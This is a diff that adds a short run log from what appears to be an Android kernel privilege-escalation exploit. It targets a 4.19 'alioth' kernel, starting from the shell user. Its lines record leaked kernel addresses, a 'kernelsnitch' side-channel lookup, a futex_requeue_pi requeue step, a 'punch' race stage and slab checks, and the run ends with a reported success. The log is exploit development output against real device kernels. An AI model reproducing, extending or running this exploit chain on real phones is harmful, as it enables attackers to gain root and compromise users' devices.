@@ -1,0 +1,28 @@
+[+] exlog open path=/data/local/tmp/ks_log.txt pid=24079 uid=2000
+[+] preload starting pid=24079 log=/data/local/tmp/ks_log.txt
+[+] startup context pid=24079 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=24079 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[+] build config pid=24079 label=alioth_4.19.157_perf_a13 slide=pselect main=pselect
+[+] p0 profile pid=24079 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffffc002e122e0 bootid_data=ffffffc002eb3f68 init_task=ffffffc002e1bfc0 root_tg=ffffffc0030c3d80 sysctl_bootid=ffffffc00335e2c4
+[*] H1A header: v12 encoding active, terminal rb nodes, nice=1, delta=0 (no ks_delta_index read)
+[*] H1A route: ADR-0003 punch-only test, one attempt
+[*] memory detected ram=0x200000000 (8 GB) window_end=ffffffc200000000
+[*] KS_PC answer preloaded mm=ffffffc1b1cfb840 (skipping kernelsnitch scan)
+[*] KS_DELTA delta=0 default (mm offset=00000001b1cfb840)
+[*] KSLAB_BASE_CANDIDATE mm=ffffffc1b1cfb840 base=ffffffc1b1cf8000 idx=0
+[*] KS_LEAK_TARGET mm=ffffffc1b1cfb840 prio_read=ffffffc1b1cfb840
+[*] H1A page prepared base=ffffffc1b1cf8000 lock=ffffffc1b1cf9350 w0=ffffffc1b1cfa220 fops=ffffffc1b1cf9000
+[*] H1A punch watchdog started pid=25372 parent=24079 timeout_ms=90000
+[*] H1A requeue issued
+[*] H1A waiter futex_requeue_pi ret=-1 errno=110
+[*] H1A punch setup nfds=320 timeout=0.200000
+[*] H1A punch enter tid=25373 nice=1
+[*] H1A punch first ret=0 errno=0
+[*] H1A punch done tid=25373 ret=0 errno=0
+[*] H1A punch returned ret=86 errno=0 calls=1 success=1 last_sched_ret=0 last_sched_errno=0
+[*] H1A load=1
+[*] KS_DIFF skb=0 bytes=32448 diffs=0
+[*] KS_DIFF skb=1 bytes=32448 diffs=0
+[*] KS_DIFF skb=2 bytes=32448 diffs=0
+[*] KS_DIFF skb=3 bytes=32448 diffs=0
+[*] H1A success calls=1 success=1
